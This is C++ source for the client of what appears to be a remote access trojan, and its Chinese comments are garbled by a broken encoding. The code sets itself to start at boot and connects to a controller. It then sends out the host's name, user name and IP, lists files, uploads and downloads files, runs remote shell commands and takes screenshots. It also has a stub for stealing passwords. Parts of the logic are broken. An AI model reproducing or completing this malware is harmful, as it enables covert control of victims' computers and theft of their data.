#include "../tcpSocket/tcpSocke.h"

int GetPCMessage(SOCKET fd);//��ȡ�����������Ϣ

int FileBrowse(SOCKET fd);//�ļ����

int FileUplode(SOCKET fd);//�ļ��ϴ�

int FileDownload(SOCKET fd);//�ļ�����

int Shell(SOCKET fd);//ִ��shellָ��

void SendScreenShot(SOCKET fd);//��ȡ��Ļ��ͼ���ҷ���

int GetPassword(SOCKET fd);//��ȡ���������

int main()
{
	//���ó��򿪻�����
	char pathName[MAX_PATH];//�ļ��������260���ַ�  MAX_PATH  260

	ComputerStart(pathName);

	init_Socket();//�����ͻ���socket

	SOCKET fd = CreatClientScoket("127.0.0.1");//����

	char str[] = "connect success";//���ӳɹ�
	encode(str);
	send(fd, str, strlen(str), 0);

	HeartBeat(fd);//��������

	char command;//�洢���յ�ָ��

	thread th1 = thread(GetPCMessage, fd);
	thread th2 = thread(FileBrowse, fd);
	thread th3 = thread(Shell, fd);
	thread th4 = thread(FileUplode, fd);
	thread th5 = thread(FileDownload, fd);
	thread th6 = thread(SendScreenShot, fd);
	thread th7 = thread(GetPassword, fd);
	while (true)
	{
		recv(fd, &command, 1, 0);
		switch (command)
		{
		case 1:
			th1.join();
			break;
		case 2:
			th2.join();
			break;
		case 3:
			th3.join();
			break;
		case 4:
			th4.join();
			break;
		case 5:
			th5.join();
			break;
		case 6:
			th6.join();
			break;
		case 7:
			th7.join();
			break;
		default:
			send(fd, "Error code", strlen("Error code"), 0);
			break;
		}
	}
	closesocket(fd);//�رտͻ���socket

	close_Socket();//WSACleanup
}

int GetPCMessage(SOCKET fd)
{
	PC_Message msg;//����msg�ṹ��
	char UserName[BUFSIZ * 2];//����ͳ�ʼ��
	char block;//���ܷ��������ַ�

	if (getmessage(&msg) == false)//��ȡĿ��������IP����������Լ��û���
	{
		err("getmessage");
	}

	TcharToChar(msg.UserName, UserName);//��TCHARת��Ϊchar

	encode(msg.PCName);//����
	cout << msg.PCName << endl;

	encode(UserName);
	cout << msg.UserName << endl;

	encode(msg.IP);
	cout << msg.IP << endl;

	if (send(fd, msg.PCName, strlen(msg.PCName), 0) == INVALID_SOCKET)//������Ӧ�ļ������Ϣ
	{
		err("send");
	}
	recv(fd, &block, 1, 0);			//����һ���ַ���ֹճ��
	if (send(fd, UserName, strlen(UserName), 0) == INVALID_SOCKET)
	{
		err("send");
	}
	recv(fd, &block, 1, 0);
	if (send(fd, msg.IP, strlen(msg.IP), 0) == INVALID_SOCKET)
	{
		err("send");
	}
	recv(fd, &block, 1, 0);

	return 0;
}

int FileBrowse(SOCKET fd)
{
	//��ȡC�̺�D���ڵ������ļ���
	char FileName[FileNameRow][FileNameCol];
	char Zero[FileNameCol] = { 0 };
	GetFileName(FileName);
	for (int i = 0; i < FileNameRow; i++)
	{
		if (strcmp(FileName[i], Zero))
		{
			//printf("%s\n", FileName[i]);
			send(fd, FileName[i], strlen(FileName[i]), 0);
		}
	}
	return 0;
}

int FileDownload(SOCKET fd)
{
	char FileName[BUFSIZ] = { 0 };
	recv(fd, FileName, BUFSIZ, 0);//����Ҫ���ص��ļ���������·����
	char File[BUFSIZ * 2] = { 0 };
	FILE* fp = fopen(FileName, "r");
	if (fp == NULL)
	{
		send(fd, "false", strlen("false"), 0);
	}
	else
	{
		while (!feof(fp))//���ļ���ֱ��ĩβ
		{
			fread(File, sizeof(unsigned __int8), 1, fp);//��File��д��
			send(fd, File, strlen(File), 0);//����
			memset(File, 0, BUFSIZ * 2);//��������
		}
	}
	return 0;
}

int FileUplode(SOCKET fd)
{
	char FileName[BUFSIZ] = { 0 };//�����ļ�����·���Ļ�����
	//��ʾ�ɷ�����ṩ
	recv(fd, FileName, BUFSIZ, 0);//����Ҫ�ϴ��ļ��ľ���·��

	FILE* fp = fopen(FileName, "wb");  //�Զ����Ʒ�ʽ�򿪣��������ļ�
	if (fp == NULL)
	{
		send(fd, "false", strlen("false"), 0);
	}
	else
	{
		char buffer[BUFSIZ * 2] = { 0 };  //�ļ�������
		int nCount;
		while ((nCount = recv(fd, buffer, BUFSIZ * 2, 0)) > 0)
		{
			fwrite(buffer, nCount, 1, fp);//���ļ���д������
		}
		send(fd, "success!", strlen("success!"), 0);
	}
	fclose(fp);//������ɺ�ر��ļ�
	return 0;
}

int Shell(SOCKET fd)
{
	char shell[BUFSIZ * 4] = { 0 };
	char res[BUFSIZ * 4] = { 0 };

	recv(fd, shell, strlen(shell), 0);	//���շ�������shellָ��
	Execmd(shell, res);					//ִ��shellָ��
	send(fd, res, strlen(res), 0);		//����ִ�к�Ľ��
	return 0;
}

void SendScreenShot(SOCKET fd)
{
	//���������ͼ��strָ���λ��
	const char* str = "D:";
	ScreenShot((LPCTSTR)(CString)str);
	readSrc();
}

int GetPassword(SOCKET fd)
{
	return 0;
}